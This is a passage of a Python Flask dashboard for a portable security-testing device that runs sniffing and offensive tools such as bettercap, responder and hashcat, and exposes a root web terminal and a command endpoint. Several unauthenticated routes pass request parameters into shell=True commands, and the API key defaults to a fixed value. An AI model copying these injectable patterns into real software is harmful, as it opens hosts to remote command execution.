#!/usr/bin/env python3
# Device: Tunnel R.A.T. (NanoPi Zero2) - main dashboard (v17)
"""
Tunnel R.A.T. Dashboard v17
+ Flipper <-> NanoPi link: when the Tunnel R.A.T. Link app (firmware tr-main) runs on
  the Flipper it opens a 2nd USB serial channel (/dev/flipper-link). The Flipper menus
  then use the NanoPi's WiFi/BLE (scans, handshake capture, wardrive) and the NanoPi
  drives the Flipper's Sub-GHz and NFC radios over the CLI channel (field mouse, NFC
  scanner, Rat Recon). Flock / Axon / Motorola flagging: IEEE vendor DB + the
  community Flock prefix list (prefix-only = "FLOCK?" suspect) +
  /opt/tunnel-rat/config/surveillance_ouis.txt. Hits go into the sightings DB and
  captures/flipper. GET /api/fz/link shows the link state.
Earlier (v16):
+ FLIPPER tab: Flipper Zero running the Tunnel R.A.T. firmware, over USB
  (/dev/flipper) OR wirelessly through the ESP32 WiFi bridge
  (TunnelRAT_FlipperBridge.ino + the "Tunnel R.A.T. Link" app on the
  Flipper). Same CLI either way: device/power/SD info, timed Sub-GHz RX /
  125 kHz RFID / iButton / IR captures saved to captures/flipper, IR universal
  remotes, SD card browser with pull-to-FILES, app launcher, shell.
  The bridge announces itself at POST /api/remote/flipper/announce (X-API-Key).
Earlier (v15):
+ /api/remote/sighting: GPS-tagged WiFi/BLE/MESH (Meshtastic/MeshCore)
  + flock/axon/motorola sightings from the T-Pager field sensor.
  Folds into the sightings DB + per-node WiGLE CSV (captures/wardrive)
  and per-layer jsonl (captures/mesh). The T-Pager also feeds GPS over
  UDP 10110 (gpsd) like the ESP32-MDK.
+ Touch terminal: tap the terminal to bring up the keyboard, an extra key row
  (Ctrl, Alt, Esc, Tab, arrows, | ~ / -, Home/End, PgUp/PgDn, ^C), swipe to
  scroll, A-/A+ text size, and the terminal resizes around the on-screen
  keyboard. xterm.js is served from the NanoPi (/vendor/xterm/) so the
  terminal works with no internet; the CDN is only a fallback.
+ Layout fits any screen: the tab bar scrolls sideways instead of pushing the
  page off the edge, phones stack the panels and scroll in portrait or
  landscape, and short screens (car head units, landscape phones) get a
  compact header. Re-fits on rotation.
Earlier (v13):
+ STINGRAY tab: Orbic RC400L running Rayhunter, through the
  tunnel-rat-orbic-link service (port 8091). Link status, the tower the Orbic
  is on, recent alerts, start/stop recording, pull captures, test alert, and
  the OpenStreetMap tower map embedded. Proxied at /api/stingray/state and
  /api/stingray/cmd (X-API-Key), plus /api/remote/stingray for the PicoCalc
  and the P4 display. Orbic captures show up in FILES under orbic/.
Earlier (v12):
+ PORTAPACK tab: H4M PortaPack / HackRF on the hub's USB-C cable.
  Mayhem mode -> remote control over Mayhem's USB serial console (live screen
  mirror with touch, D-pad/encoder, app launcher, clock sync, shell, full-colour
  screenshots). SDR mode -> receive-only HackRF: one-shot sweeps, live
  spectrum + waterfall, GPS-tagged IQ capture, rtl_433 via SoapySDR.
+ MDK GPS over WiFi: the ESP32-MDK sends NMEA by UDP to 192.168.50.1:10110;
  gpsd ingests it, the GPS panel shows which source has the fix.
+ SPECTRUM + SCREEN live panels; RTL scans also draw on the spectrum.
Earlier (v11):
+ WIFI tab: scan/join networks on the USB uplink adapter, saved networks,
  tunnel-rat AP status, connected clients, AP password (NetworkManager/nmcli)
+ PINEAPPLE tab: receives WiFi Pineapple Pager recon uploads at
  POST /api/remote/pineapple (X-API-Key) and shows them as an AP table
+ Fixes from v10: SDR buttons, duplicate SDR routes, /api/status + /api/log,
  FM tuning, dump1090 port clash, capture paths/duplicated lines, CLI newlines
Earlier (v8): TRUE live feeds over Server-Sent Events (SSE) — no new dependency
  - Live packet stream (tcpdump -l piped line by line as it happens)
  - Generic live log-tail stream for any tool (Suricata, Bettercap, etc.)
+ Everything from v7: CLI tab, per-tool capture dirs, captures-only file viewer
"""

import os, re, subprocess, threading, queue, time, signal
from datetime import datetime
from flask import Flask, render_template_string, jsonify, request, Response
import psutil

app = Flask(__name__)

# -- Remote API key (for the PicoCalc companion remote / any external client) --
# Change this before exposing the device beyond your own LAN.
REMOTE_API_KEY = os.environ.get('TUNNEL_RAT_API_KEY', 'tunnelrat-change-me')

def require_api_key(fn):
    from functools import wraps
    @wraps(fn)
    def wrapper(*args, **kwargs):
        key = request.headers.get('X-API-Key', '')
        if key != REMOTE_API_KEY:
            return jsonify({'ok': False, 'error': 'Invalid or missing API key'}), 401
        return fn(*args, **kwargs)
    return wrapper

HOME          = os.path.expanduser('~')
OPT_SCRIPTS   = '/opt/tunnel-rat/scripts'
HOME_BUILD    = f'{HOME}/tunnel-rat-build'
CAPTURES_BASE = '/opt/tunnel-rat/captures'

TOOL_DIRS = {
    'bettercap': f'{CAPTURES_BASE}/bettercap',
    'tcpdump':   f'{CAPTURES_BASE}/tcpdump',
    'nmap':      f'{CAPTURES_BASE}/nmap',
    'suricata':  f'{CAPTURES_BASE}/suricata',
    'clamav':    f'{CAPTURES_BASE}/clamav',
    'zeek':      f'{CAPTURES_BASE}/zeek',
    'mitmproxy': f'{CAPTURES_BASE}/mitmproxy',
    'responder': f'{CAPTURES_BASE}/responder',
    'hashcat':   f'{CAPTURES_BASE}/hashcat',
    'aircrack':  f'{CAPTURES_BASE}/aircrack',
    'exfil':     f'{CAPTURES_BASE}/exfil',
    'logs':      f'{CAPTURES_BASE}/logs',
    'sdr':       f'{CAPTURES_BASE}/sdr',
    'bluetooth': f'{CAPTURES_BASE}/bluetooth',
    'pineapple': f'{CAPTURES_BASE}/pineapple',
    'wardrive':  f'{CAPTURES_BASE}/wardrive',
    'portapack': f'{CAPTURES_BASE}/portapack',
    'orbic':     f'{CAPTURES_BASE}/orbic',
    'mesh':      f'{CAPTURES_BASE}/mesh',
    'flipper':   f'{CAPTURES_BASE}/flipper',
}

TOOL_ICONS = {
    'bettercap':'🎯','tcpdump':'📦','nmap':'🌐','suricata':'🛡️',
    'clamav':'🦠','zeek':'🔬','mitmproxy':'🔓','responder':'🎣',
    'hashcat':'💀','aircrack':'📶','exfil':'📤','logs':'📋','sdr':'📻',
    'bluetooth':'🔵','pineapple':'🍍','portapack':'📟','orbic':'📡',
    'mesh':'🕸️','flipper':'🐬',
}

activity_log = []
import time as _time
SESSION_START = _time.time()   # files newer than this = current connection
cli_cwd      = [HOME]   # server-side cwd for CLI (single-user device)

# -- Live stream registry --------------------------------------------
live_sessions = {}   # session_id -> {'proc': Popen, 'listeners': set()}
live_lock = threading.Lock()

LIVE_LOG_FEEDS = {
    'suricata':  ('sudo tail -F /var/log/suricata/fast.log 2>/dev/null', 'Suricata live alerts'),
    'bettercap': (f'tail -F {CAPTURES_BASE}/bettercap/*.log 2>/dev/null', 'Bettercap live output'),
    'zeek':      (f'tail -F {CAPTURES_BASE}/zeek/*.log 2>/dev/null', 'Zeek live output'),
    'syslog':    ('sudo tail -F /var/log/syslog 2>/dev/null', 'System log live tail'),
}

def _broadcast(session_id, line):
    with live_lock:
        sess = live_sessions.get(session_id)
        if not sess:
            return
        dead = []
        for q in sess['listeners']:
            try:
                q.put_nowait(line)
            except queue.Full:
                dead.append(q)
        for q in dead:
            sess['listeners'].discard(q)

def _reader_thread(session_id, proc):
    try:
        for raw in iter(proc.stdout.readline, b''):
            if not raw:
                break
            line = raw.decode('utf-8', errors='replace').rstrip('\n')
            if line:
                _broadcast(session_id, line)
    except Exception as e:
        _broadcast(session_id, f'[stream error: {e}]')
    finally:
        _broadcast(session_id, '[stream ended]')
        with live_lock:
            sess = live_sessions.get(session_id)
            if sess:
                sess['proc'] = None

def _ensure_session(session_id, cmd):
    with live_lock:
        sess = live_sessions.get(session_id)
        if sess and sess.get('proc') and sess['proc'].poll() is None:
            return sess
        proc = subprocess.Popen(
            cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            preexec_fn=os.setsid, bufsize=1)
        sess = {'proc': proc, 'listeners': set()}
        live_sessions[session_id] = sess
        t = threading.Thread(target=_reader_thread, args=(session_id, proc), daemon=True)
        t.start()
        log(f'Live feed started: {session_id}')
        return sess

def _stop_session(session_id):
    with live_lock:
        sess = live_sessions.get(session_id)
        if sess and sess.get('proc'):
            try:
                os.killpg(os.getpgid(sess['proc'].pid), signal.SIGTERM)
            except Exception:
                pass
            sess['proc'] = None
        live_sessions.pop(session_id, None)
    log(f'Live feed stopped: {session_id}')

def sse_stream(session_id, cmd):
    _ensure_session(session_id, cmd)
    q = queue.Queue(maxsize=500)
    with live_lock:
        live_sessions[session_id]['listeners'].add(q)
    try:
        yield 'event: open\ndata: connected\n\n'
        while True:
            try:
                line = q.get(timeout=20)
                safe = line.replace('\r', '')
                yield f'data: {safe}\n\n'
            except queue.Empty:
                yield 'event: ping\ndata: keepalive\n\n'
    except GeneratorExit:
        pass
    finally:
        with live_lock:
            sess = live_sessions.get(session_id)
            if sess:
                sess['listeners'].discard(q)
                if not sess['listeners'] and sess.get('proc'):
                    try:
                        os.killpg(os.getpgid(sess['proc'].pid), signal.SIGTERM)
                    except Exception:
                        pass
                    sess['proc'] = None
                    live_sessions.pop(session_id, None)


def init_dirs():
    os.makedirs(CAPTURES_BASE, exist_ok=True)
    for d in TOOL_DIRS.values():
        os.makedirs(d, exist_ok=True)

def script_dir():
    return OPT_SCRIPTS if os.path.isdir(OPT_SCRIPTS) else HOME_BUILD

def stamp():
    return datetime.now().strftime('%Y%m%d_%H%M%S')

def log(msg):
    entry = f'[{datetime.now().strftime("%H:%M:%S")}] {msg}'
    activity_log.append(entry)
    if len(activity_log) > 100:
        activity_log.pop(0)
    print(entry)

def run_cmd(cmd, desc, save_to=None, timeout=10):
    try:
        log(f'Running: {desc}')
        if save_to:
            os.makedirs(os.path.dirname(save_to), exist_ok=True)
            full = f'({cmd}) 2>&1 | tee {save_to}'
        else:
            full = f'{cmd} 2>&1'
        r = subprocess.run(full, shell=True, stdout=subprocess.PIPE,
                           stderr=subprocess.STDOUT, timeout=timeout)
        out = r.stdout.decode('utf-8', errors='replace').strip()
        log(f'✓ {desc}' + (f' → {os.path.basename(save_to)}' if save_to else ''))
        return {'ok': True, 'output': out[:3000] or '(no output)',
                'saved': save_to}
    except subprocess.TimeoutExpired:
        log(f'✗ {desc}: timeout')
        return {'ok': False, 'error': 'Timed out'}
    except Exception as e:
        log(f'✗ {desc}: {e}')
        return {'ok': False, 'error': str(e)}

def parse_pkt_line(line):
    m  = re.match(r'^(\d{2}:\d{2}:\d{2}\.\d+)\s+(.*)', line)
    ts = m.group(1) if m else ''
    rest = m.group(2) if m else line
    proto = 'TCP'
    if   'UDP'  in rest or 'udp'  in rest: proto = 'UDP'
    elif 'ICMP' in rest or 'icmp' in rest: proto = 'ICMP'
    elif 'ARP'  in rest or 'arp'  in rest: proto = 'ARP'
    elif '.53 ' in rest or ' DNS' in rest:  proto = 'DNS'
    elif '.443 ' in rest:                   proto = 'HTTPS'
    elif '.80 '  in rest:                   proto = 'HTTP'
    ip = re.search(r'(\d+\.\d+\.\d+\.\d+(?:\.\d+)?)\s*>\s*(\d+\.\d+\.\d+\.\d+(?:\.\d+)?)', rest)
    return {'time': ts, 'proto': proto,
            'src': ip.group(1) if ip else '',
            'dst': ip.group(2) if ip else '',
            'info': rest[:130]}


# ─── Routes ──────────────────────────────────────────────────────────

@app.route('/')
def index():
    from flask import Response
    # Inject the API key so the browser UI can authenticate to /api/cli.
    # The page is only served to someone who can already reach the dashboard;
    # this lets us require the key on the root-shell endpoint without breaking
    # the UI's own access.
    page = HTML.replace('__TR_API_KEY__', REMOTE_API_KEY)
    return Response(page, mimetype='text/html')

# Serve the OpenPGP library locally so the PGP tab never loads crypto from a
# CDN — it stays fully offline on the device. File is installed to this path.
@app.route('/bg/<name>')
def theme_bg(name):
    from flask import send_file, abort
    # Only serve known theme background files.
    if not name.replace('_','').replace('.','').replace('-','').isalnum():
        abort(404)
    for base in ('/opt/tunnel-rat/backgrounds', '/root/tunnel-rat-build/backgrounds'):
        p = os.path.join(base, name)
        if os.path.isfile(p) and os.path.abspath(p).startswith(base):
            return send_file(p, mimetype='image/jpeg')
    abort(404)

@app.route('/vendor/openpgp.min.js')
def vendor_openpgp():
    from flask import Response
    for p in ('/opt/tunnel-rat/vendor/openpgp.min.js',
              '/root/tunnel-rat-build/vendor/openpgp.min.js'):
        if os.path.isfile(p):
            with open(p, 'r') as f:
                return Response(f.read(), mimetype='application/javascript')
    return Response('/* openpgp.min.js not installed on device */',
                    mimetype='application/javascript', status=404)

@app.route('/vendor/xterm/<name>')
def vendor_xterm(name):
    """Web terminal library kept on the device, so the terminal works offline."""
    from flask import send_file, abort
    if name not in ('xterm.min.js', 'xterm.min.css'):
        abort(404)
    for d in ('/opt/tunnel-rat/vendor', '/root/tunnel-rat-build/vendor'):
        p = os.path.join(d, name)
        if os.path.isfile(p):
            return send_file(p, max_age=86400, mimetype=(
                'application/javascript' if name.endswith('.js') else 'text/css'))
    abort(404)

# ---------------------------------------------------------------------------
# Full web terminal: a persistent PTY running a real login shell, so the
# dashboard behaves like SSH — cd persists, interactive tools work, Ctrl-C,
# tab-completion, top/nano, all of it. Output is buffered and polled by the
# browser (xterm.js); input and resize are posted. One shared session.
# ---------------------------------------------------------------------------
import pty, fcntl, termios, struct, select as _select

_term = {'fd': None, 'pid': None, 'buf': b'', 'lock': threading.Lock()}

def _term_spawn():
    """Start (or restart) the PTY shell."""
    with _term['lock']:
        if _term['fd'] is not None:
            return
        pid, fd = pty.fork()
        if pid == 0:
            # child: become a real interactive bash login shell
            os.environ['TERM'] = 'xterm-256color'
            os.environ['HOME'] = '/root'
            os.execvp('bash', ['bash', '-l'])
        else:
            _term['fd'] = fd
            _term['pid'] = pid
            _term['buf'] = b''
            # non-blocking reads
            flags = fcntl.fcntl(fd, fcntl.F_GETFL)
            fcntl.fcntl(fd, fcntl.F_SETFL, flags | os.O_NONBLOCK)
            threading.Thread(target=_term_reader, daemon=True).start()

def _term_reader():
    fd = _term['fd']
    while fd is not None and _term['fd'] == fd:
        try:
            r, _, _ = _select.select([fd], [], [], 0.3)
            if r:
                data = os.read(fd, 65536)
                if not data:
                    break
                with _term['lock']:
                    _term['buf'] += data
                    # cap buffer so a runaway tool can't eat memory
                    if len(_term['buf']) > 400000:
                        _term['buf'] = _term['buf'][-400000:]
        except (OSError, BlockingIOError):
            break
    # shell exited — clear so next read respawns
    with _term['lock']:
        _term['fd'] = None
        _term['pid'] = None

@app.route('/api/term/read')
@require_api_key
def term_read():
    if _term['fd'] is None:
        _term_spawn()
    with _term['lock']:
        out = _term['buf']
        _term['buf'] = b''
    return Response(out, mimetype='application/octet-stream')

@app.route('/api/term/write', methods=['POST'])
@require_api_key
def term_write():
    if _term['fd'] is None:
        _term_spawn()
    data = request.get_data() or b''
    try:
        os.write(_term['fd'], data)
    except OSError:
        return jsonify({'ok': False})
    return jsonify({'ok': True})

@app.route('/api/term/resize', methods=['POST'])
@require_api_key
def term_resize():
    if _term['fd'] is None:
        return jsonify({'ok': False})
    body = request.json or {}
    rows = int(body.get('rows', 24)); cols = int(body.get('cols', 80))
    try:
        fcntl.ioctl(_term['fd'], termios.TIOCSWINSZ,
                    struct.pack('HHHH', rows, cols, 0, 0))
    except OSError:
        pass
    return jsonify({'ok': True})

@app.route('/api/term/kill', methods=['POST'])
@require_api_key
def term_kill():
    """Restart the shell (fresh session)."""
    with _term['lock']:
        if _term['pid']:
            try: os.kill(_term['pid'], signal.SIGKILL)
            except OSError: pass
        _term['fd'] = None; _term['pid'] = None; _term['buf'] = b''
    return jsonify({'ok': True})

@app.route('/api/stats')
def api_stats():
    return jsonify({
        'cpu':    psutil.cpu_percent(1),
        'memory': psutil.virtual_memory().percent,
        'disk':   psutil.disk_usage('/').percent,
        'ts':     datetime.now().strftime('%H:%M:%S'),
        'log':    activity_log[-15:]
    })

@app.route('/api/interfaces')
def api_interfaces():
    try:
        r = subprocess.run(
            "ip link show | grep -E '^[0-9]+:' | awk '{print $2}' | tr -d ':'",
            shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=3)
        ifaces = [i.strip() for i in r.stdout.decode().split('\n')
                  if i.strip() and i.strip() != 'lo']
        return jsonify({'interfaces': ifaces or ['eth0']})
    except:
        return jsonify({'interfaces': ['eth0']})

# ── CLI ──────────────────────────────────────────────────────────────

@app.route('/api/cli', methods=['POST'])
@require_api_key
def api_cli():
    cmd = request.json.get('cmd', '').strip()
    if not cmd:
        return jsonify({'ok': True, 'output': '', 'cwd': cli_cwd[0]})

    # Handle cd natively so the server tracks directory state
    if cmd == 'cd' or cmd.startswith('cd ') or cmd.startswith('cd\t'):
        parts  = cmd.split(None, 1)
        target = os.path.expanduser(parts[1].strip() if len(parts) > 1 else '~')
        if not os.path.isabs(target):
            target = os.path.join(cli_cwd[0], target)
        target = os.path.normpath(target)
        if os.path.isdir(target):
            cli_cwd[0] = target
            return jsonify({'ok': True, 'output': '', 'cwd': cli_cwd[0]})
        return jsonify({'ok': False,
                        'output': f'bash: cd: {target}: No such file or directory',
                        'cwd': cli_cwd[0]})

    log(f'CLI: {cmd}')
    # Tools detached from a service inherit no HOME, so tools that read a
    # config from ~ (netdiscover, arp-scan, etc.) fail. Give them a real env.
    cli_env = dict(os.environ)
    cli_env.setdefault('HOME', '/root')
    cli_env.setdefault('USER', 'root')
    # Interactive/long-running tools — detach and return immediately
    bg_tools = ['bettercap','mitmproxy','mitmdump','mitmweb','hostapd','kismet','wifite','airodump','aireplay','rtl_fm','rtl_tcp','responder','sherlock','amass','nikto']
    _cmd_lc = cmd.lower()
    is_bg = any(t in _cmd_lc for t in bg_tools) or cmd.strip().endswith('&')
    try:
        if is_bg:
            clean = cmd.rstrip('&').strip()
            # Name the log after the actual tool, not a shell prefix like
            # `source ...; IF=...; bettercap ...`. Find which bg tool is in it.
            tool_name = next((t for t in bg_tools if t in _cmd_lc), None)
            if not tool_name:
                # fall back to the first real command word after any 'source;' prefix
                last = clean.split(';')[-1].strip()
                tool_name = last.split()[0].split('/')[-1] if last else 'tool'
            log_file = f'/tmp/tr_{tool_name}.log'
            with open(log_file, 'w') as lf:
                lf.write(f'=== {tool_name} started ===\n')
            subprocess.Popen(f'cd {cli_cwd[0]} && {clean}', shell=True,
                           stdout=open(log_file,'a'), stderr=subprocess.STDOUT,
                           env=cli_env)
            log(f'{tool_name} started')
            return jsonify({'ok': True,
                          'output': f'[{tool_name} started — streaming output]\nLog: {log_file}\nUse: pkill {tool_name} to stop',
                          'cwd': cli_cwd[0], 'stream': f'/api/cli/tail?tool={tool_name}'})
        r = subprocess.run(f'cd {cli_cwd[0]} && {cmd}',
                           shell=True, stdout=subprocess.PIPE,
                           stderr=subprocess.STDOUT, timeout=60, env=cli_env)
        out = r.stdout.decode('utf-8', errors='replace')
        if len(out) > 50000:
            out = out[:50000] + '\n\n[... output truncated at 50 KB ...]'
        return jsonify({'ok': r.returncode == 0, 'output': out, 'cwd': cli_cwd[0]})
    except subprocess.TimeoutExpired:
        return jsonify({'ok': False, 'output': '[timed out after 60s — try adding & to run in background]', 'cwd': cli_cwd[0]})
    except Exception as e:
        return jsonify({'ok': False, 'output': str(e), 'cwd': cli_cwd[0]})

# ── Live Capture Routes ──────────────────────────────────────────────────────
import glob, os

@app.route('/api/capture/start', methods=['POST'])
def capture_start():
    data = request.json or {}
    mode = data.get('mode', 'tcpdump')
    iface = data.get('iface', 'end0')
    filt  = data.get('filter', '')
    log_file = f'/tmp/tr_{mode}.log'
    pcap_file = f'{TOOL_DIRS["tcpdump"]}/{stamp()}_{mode}.pcap'
    os.makedirs(TOOL_DIRS['tcpdump'], exist_ok=True)

    cmds = {
        # --print keeps text flowing to the live pane while -w saves the pcap
        'tcpdump':   f'tcpdump -i {iface} -n -l -U -w {pcap_file} --print {filt} 2>&1 | tee {log_file}',
        'tcpdump-v': f'tcpdump -i {iface} -n -l -v {filt} 2>&1 | tee {log_file}',
        'tshark':    f'tshark -i {iface} -l {filt} 2>&1 | tee {log_file}',
        'tshark-http':f'tshark -i {iface} -l -Y http 2>&1 | tee {log_file}',
        'tshark-dns': f'tshark -i {iface} -l -Y dns 2>&1 | tee {log_file}',
        'bettercap-sniff': f'bettercap --iface {iface} -eval "net.sniff on" 2>&1 | tee {log_file}',
        'arp-scan':  f'arp-scan -I {iface} -l 2>&1 | tee {log_file}',
        'netdiscover':f'netdiscover -i {iface} -r 192.168.50.0/24 2>&1 | tee {log_file}',
    }
    cmd = cmds.get(mode, f'tcpdump -i {iface} -n -l 2>&1 | tee {log_file}')
    with open(log_file, 'w') as lf:
        lf.write(f'=== {mode} on {iface} started ===\n')
    subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    log(f'Capture: {mode} on {iface}')
    return jsonify({'ok': True, 'log': log_file, 'pcap': pcap_file, 'tool': mode})

@app.route('/api/capture/stop', methods=['POST'])
def capture_stop():
    data = request.json or {}
    tool = data.get('tool', 'tcpdump')
    subprocess.run(f'pkill -f {tool}', shell=True)
    return jsonify({'ok': True, 'msg': f'{tool} stopped'})

PAYLOAD_DIR = '/opt/tunnel-rat/payloads'

@app.route('/api/payloads')
def payloads_list():
    out = []
    try:
        for f in sorted(glob.glob(f'{PAYLOAD_DIR}/*.sh')):
            name = os.path.basename(f)
            label, desc, target = name, '', ''
            try:
                with open(f) as fh:
                    for line in fh.read().splitlines()[:8]:
                        if 'TR-NAME:' in line: label = line.split('TR-NAME:',1)[1].strip()
                        elif 'TR-DESC:' in line: desc = line.split('TR-DESC:',1)[1].strip()
                        elif 'TR-TARGET:' in line: target = line.split('TR-TARGET:',1)[1].strip()
            except: pass
            out.append({'file': name, 'label': label, 'desc': desc, 'target': target})
    except: pass
    return jsonify({'payloads': out})

@app.route('/api/capture/list')
def capture_list():
    files = []
    try:
        for f in sorted(glob.glob(f'{TOOL_DIRS["tcpdump"]}/*'), reverse=True)[:20]:
            sz = os.path.getsize(f)
            files.append({'name': os.path.basename(f), 'size': sz,
                         'path': f, 'modified': os.path.getmtime(f)})
    except: pass
    return jsonify({'files': files})

@app.route('/api/capture/tail')
def capture_tail():
    tool = request.args.get('tool','tcpdump')
    log_file = f'/tmp/tr_{tool}.log'
    offset = int(request.args.get('offset', 0))
    try:
        with open(log_file) as f:
            content = f.read()
        return jsonify({'ok': True, 'output': content[offset:offset+8000],
                       'total': len(content)})
    except:
        return jsonify({'ok': False, 'output': '', 'total': 0})

# ── CLI Log Streaming ────────────────────────────────────────────────────────
@app.route('/api/cli/tail')
@require_api_key
def cli_tail():
    tool = request.args.get('tool','')
    log_file = f'/tmp/tr_{tool}.log'
    try:
        with open(log_file) as f:
            content = f.read()
        return jsonify({'ok': True, 'output': content[-8000:], 'running': True})
    except:
        return jsonify({'ok': False, 'output': 'No log found', 'running': False})

@app.route('/api/cli/logs')
def cli_logs():
    import glob
    logs = {}
    for f in glob.glob('/tmp/tr_*.log'):
        tool = f.replace('/tmp/tr_','').replace('.log','')
        try:
            with open(f) as fh:
                logs[tool] = fh.read()[-2000:]
        except: pass
    return jsonify({'logs': logs})

# ── Packets ──────────────────────────────────────────────────────────

@app.route('/api/packets')
def api_packets():
    iface = request.args.get('iface', 'eth0')
    count = min(int(request.args.get('count', '30')), 100)
    save  = request.args.get('save', 'false').lower() == 'true'
    log(f'Packet capture: {iface} x{count}')

    pcap = f'{TOOL_DIRS["tcpdump"]}/{stamp()}_{iface}.pcap' if save else None

    for prefix in ['', 'sudo ']:
        w   = f'-w {pcap}' if pcap else ''
        cmd = f'{prefix}tcpdump -i {iface} -n -c {count} {w} 2>&1'
        try:
            r = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                               stderr=subprocess.STDOUT, timeout=9)
            out = r.stdout.decode('utf-8', errors='replace')
            if 'Permission denied' in out or 'Operation not permitted' in out:
                continue
            if pcap and os.path.exists(pcap):
                r2 = subprocess.run(f'{prefix}tcpdump -r {pcap} -n 2>&1',
                                    shell=True, stdout=subprocess.PIPE,
                                    stderr=subprocess.STDOUT, timeout=5)
                out = r2.stdout.decode('utf-8', errors='replace')
            lines = [l.strip() for l in out.split('\n') if l.strip()]
            pkts, sl = [], ''
            for line in lines:
                if 'listening on' in line or line.startswith('tcpdump:'): continue
                if 'packets captured' in line or 'packets received' in line:
                    sl = line; continue
                pkts.append(parse_pkt_line(line))
            log(f'✓ {len(pkts)} pkts on {iface}' + (' → tcpdump dir' if pcap else ''))
            return jsonify({'ok': True, 'packets': pkts, 'stats': sl,
                            'iface': iface, 'saved': pcap})
        except subprocess.TimeoutExpired:
            continue
        except Exception:
            continue

    log('✗ Packet capture failed')
    return jsonify({'ok': False, 'packets': [],
                    'error': 'tcpdump needs elevated permissions.',
                    'fix':   'sudo setcap cap_net_raw+eip /usr/bin/tcpdump'})

# -- Remote API (for PicoCalc companion / external clients) -----------
# All routes here require header: X-API-Key: <REMOTE_API_KEY>
# Responses kept small and flat — designed for a microcontroller client.

@app.route('/api/remote/ping')
@require_api_key
def api_remote_ping():
    return jsonify({'ok': True, 'device': 'Tunnel R.A.T.', 'ts': datetime.now().strftime('%H:%M:%S')})

@app.route('/api/remote/status')
@require_api_key
def api_remote_status():
    try:
        sdr = subprocess.run('rtl_test -t 2>&1', shell=True, stdout=subprocess.PIPE,
                             stderr=subprocess.STDOUT, timeout=4)
        sdr_out = sdr.stdout.decode('utf-8', errors='replace')
        sdr_present = 'Found' in sdr_out and 'No supported devices' not in sdr_out
    except Exception:
        sdr_present = False
    return jsonify({
        'ok':     True,
        'cpu':    psutil.cpu_percent(1),
        'memory': psutil.virtual_memory().percent,
        'disk':   psutil.disk_usage('/').percent,
        'sdr':    sdr_present,
        'portapack': _pp_mode()['mode'],
        'flipper': _fz_link_kind(),
        'stingray': (_orbic_link('/api/state', timeout=2) or {}).get('mode', 'off'),
        'log':    activity_log[-5:],
    })

@app.route('/api/remote/run', methods=['POST'])
@require_api_key
def api_remote_run():
    """Same action set as /api/run, for the PicoCalc's quick-action buttons.
    Also handles 'ble-audit-log' — the PicoCalc BLE auditor uploads its
    scan results here since the NanoPi itself has no Bluetooth hardware."""
    body = request.json or {}
    action = body.get('action', '')

    if action == 'ble-audit-log':
        devices = body.get('data', {}).get('devices', [])
        os.makedirs(TOOL_DIRS['bluetooth'], exist_ok=True)
        out_path = f"{TOOL_DIRS['bluetooth']}/{stamp()}_ble-audit.json"
        import json
        try:
            with open(out_path, 'w') as f:
                json.dump({'uploaded_at': datetime.now().isoformat(), 'devices': devices}, f, indent=2)
            flagged = [d for d in devices if d.get('flagged')]
            log(f'BLE audit upload: {len(devices)} devices ({len(flagged)} flagged) → bluetooth/')
            return jsonify({'ok': True, 'saved': out_path, 'count': len(devices), 'flagged': len(flagged)})
        except Exception as e:
            return jsonify({'ok': False, 'error': str(e)})

    return api_run_internal(action, body.get("target"))

@app.route('/api/remote/sdr')
@require_api_key
def api_remote_sdr_status():
    return api_sdr_status()

# -- STINGRAY WATCH (Orbic + Rayhunter) ------------------------------
# The tunnel-rat-orbic-link service (port 8091) does the work: Orbic link, GPS
# feed into Rayhunter, tower checks, phone alerts and the map. These routes
# proxy it so the dashboard, PicoCalc and P4 display reach it through one port
# and one API key.
ORBIC_LINK_URL = os.environ.get('TR_ORBIC_LINK_URL', 'http://127.0.0.1:8091')
ORBIC_LINK_CFG = '/opt/tunnel-rat/orbic-link/orbic_link.json'
STINGRAY_CMDS = ('start', 'stop', 'offload', 'test')

def _orbic_link(path, data=None, timeout=4):
    """Call the orbic-link service. Returns parsed JSON, or None if it's down."""
    import json as _json, urllib.request as _ur, urllib.error as _ue
    headers = {}
    body = None
    if data is not None:
        headers['Content-Type'] = 'application/json'
        try:
            with open(ORBIC_LINK_CFG) as f:
                tok = _json.load(f).get('web_token') or ''
            if tok:
                headers['X-Token'] = tok
        except Exception:
            pass
        body = _json.dumps(data).encode()
    req = _ur.Request(ORBIC_LINK_URL + path, data=body, headers=headers,
                      method='POST' if body is not None else 'GET')
    try:
        with _ur.urlopen(req, timeout=timeout) as r:
            return _json.loads(r.read().decode('utf-8', 'replace'))
    except _ue.HTTPError as e:
        try:
            return _json.loads(e.read().decode('utf-8', 'replace'))
        except Exception:
            return {'ok': False, 'detail': f'orbic-link HTTP {e.code}'}
    except Exception:
        return None

def _stingray_summary(alert_count=10):
    st = _orbic_link('/api/state')
    if st is None:
        return {'ok': False, 'service': 'down',
                'detail': 'tunnel-rat-orbic-link is not running'}
    al = _orbic_link(f'/api/alerts?limit={int(alert_count)}') or []
    return {'ok': True, 'service': 'up', 'state': st, 'alerts': al}

@app.route('/api/stingray/state')
@require_api_key
def stingray_state():
    return jsonify(_stingray_summary())

@app.route('/api/stingray/cmd', methods=['POST'])
@require_api_key
def stingray_cmd():
    cmd = (request.json or {}).get('cmd', '')
    if cmd not in STINGRAY_CMDS:
        return jsonify({'ok': False, 'detail': 'unknown command'}), 400
    res = _orbic_link('/api/cmd', {'cmd': cmd}, timeout=12)
    if res is None:
        return jsonify({'ok': False, 'detail': 'tunnel-rat-orbic-link is not running'})
    log(f"Stingray Watch: {res.get('detail', cmd)}")
    return jsonify(res)

@app.route('/api/remote/stingray')
@require_api_key
def api_remote_stingray():
    """Small, flat summary for microcontroller clients (PicoCalc, P4 display)."""
    s = _stingray_summary(alert_count=5)
    if not s['ok']:
        return jsonify(s)
    st = s['state']
    return jsonify({
        'ok': True,
        'mode': st.get('mode'),
        'recording': st.get('recording'),
        'gps': bool(st.get('gps')),
        'online': st.get('online'),
        'tower': (st.get('cell') or {}).get('id'),
        'alerts': [{'sev': a.get('sev'), 'source': a.get('source'),
                    'reason': (a.get('reason') or '')[:80], 'ts': a.get('ts')}
                   for a in s['alerts']],
    })

# -- Live packet stream (SSE) ----------------------------------------

@app.route('/api/packets/live')
def api_packets_live():
    iface = request.args.get('iface', 'eth0')
